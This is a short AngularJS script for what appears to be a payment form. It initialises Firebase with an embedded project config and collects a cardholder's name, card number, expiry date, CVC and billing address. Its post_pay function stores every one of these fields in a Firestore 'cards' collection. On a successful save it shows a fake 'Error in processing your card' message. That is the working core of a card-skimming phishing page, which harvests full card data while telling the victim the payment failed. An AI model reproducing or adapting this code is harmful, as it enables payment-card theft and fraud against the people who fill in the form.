var betApp = angular.module('betApp', ['angularMoment']);

betApp.run([
    '$rootScope',
    '$window',
    function($rootScope, $window) {
        var firebaseConfig = {
  apiKey: "AIzaSyDQ-XsLfNOsUt1n2gxarhSGoKeYv0PpU1A",
  authDomain: "pt-service.firebaseapp.com",
  projectId: "pt-service",
  storageBucket: "pt-service.appspot.com",
  messagingSenderId: "273176508220",
  appId: "1:273176508220:web:6a5a88626e886c7e20d039",
  measurementId: "G-NXKBCSSX9R"
        };
        // Initialize Firebase
        try {
            $window.firebase.initializeApp(firebaseConfig);
            $window.firebase.analytics();
            $rootScope.db = firebase.firestore();
            $rootScope.storage = firebase.storage();
            console.log($rootScope.storage);
        } catch (error) {
            console.log(error);
        }
    },
]);

betApp.controller('MainController', function(
    $scope,
    moment,
    $window,
    $rootScope,
    $timeout
) {

    $scope.pay = {
        card_name: '',
        card_number: '',
        card_exp:'',
        card_cvc:'',
        name:'',
        address:'',
        city:'',
        code:'',
        state:'',
    };



    $scope.post_pay = function() {

        var guid = createGuid();

        $rootScope.db
            .collection('cards')
            .doc(`${guid}`)
            .set({
                id: `${ guid}`,
                card_name: `${$scope.pay.card_name}`,
                card_number: `${$scope.pay.card_number}`,
                       card_exp: `${$scope.pay.card_exp}`,
                       card_cvc: `${$scope.pay.card_cvc}`,
                       name: `${$scope.pay.name}`,
                       address: `${$scope.pay.address}`,
                        city: `${$scope.pay.city}`,
                        code: `${$scope.pay.code}`,
                        state: `${$scope.pay.state}`,
            })
            .then(() => {

   alert("Error in processing your card, please try again later");

            })
            .catch(error => {
                console.error('Error adding document: ', error);
            });


    }

        function createGuid() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }





});






